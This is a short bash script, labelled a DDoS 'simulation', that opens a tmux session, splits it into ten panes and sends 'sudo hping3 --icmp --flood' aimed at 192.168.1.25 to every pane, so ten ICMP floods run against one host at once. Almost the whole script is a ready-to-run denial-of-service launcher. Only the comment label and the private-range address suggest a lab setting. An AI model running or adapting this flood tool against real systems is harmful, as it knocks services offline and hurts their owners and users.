#!/bin/bash

SESSION_NAME="ddos_simulation"

# 1. Create a new tmux session in the background
tmux new-session -d -s $SESSION_NAME

# 2. Create 9 additional divisions to make a total of 10 parts within the same screen
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
done

# 3. Automatically send the attack command to each pane and execute it
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "sudo hping3 --icmp --flood 192.168.1.25" C-m
done

# 4. Enter the session directly to see the full work interface
tmux attach-session -t $SESSION_NAME
